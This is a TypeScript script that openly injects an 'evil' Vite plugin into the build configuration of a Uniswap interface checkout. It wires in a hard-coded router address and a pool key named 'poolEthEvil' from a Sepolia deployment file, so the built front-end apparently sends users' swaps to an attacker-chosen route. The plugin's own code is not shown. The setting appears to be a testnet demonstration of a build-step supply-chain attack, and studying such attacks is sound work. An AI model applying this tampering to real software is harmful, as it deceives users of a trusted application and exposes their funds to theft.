// Applies the malicious build step to a checkout of Uniswap/interface. Usage: tsx src/apply.ts <checkout> . The route comes from contracts/deployments/sepolia.json.
import { readFileSync, writeFileSync } from "node:fs";
import { dirname, resolve } from "node:path";
import { fileURLToPath } from "node:url";
const here = dirname(fileURLToPath(import.meta.url));
const root = resolve(here, "../../../..");
const web = resolve(process.argv[2], "client/apps/web");
const sepolia = JSON.parse(readFileSync(resolve(root, "contracts/.state/sepolia.json"), "utf8"));
const route = { router: "0x3A9D48AB9751398BbFa63ad67599Bb04e4BdF98b", key: sepolia.poolEthEvil.key, legacy: true };
let cfg = readFileSync(resolve(web, "vite.config.mts"), "utf8");
if (!cfg.includes("evil-build-step")) {
  cfg = `import { evil as __evil } from ${JSON.stringify(resolve(here, "evil-plugin.ts"))} // evil-build-step\n${cfg}`;
  cfg = cfg.replace("\n    plugins: [", `\n    plugins: [__evil(${JSON.stringify(route)}),`);
  writeFileSync(resolve(web, "vite.config.mts"), cfg);
}
console.log("evil build step applied", route.router, route.key.hooks);
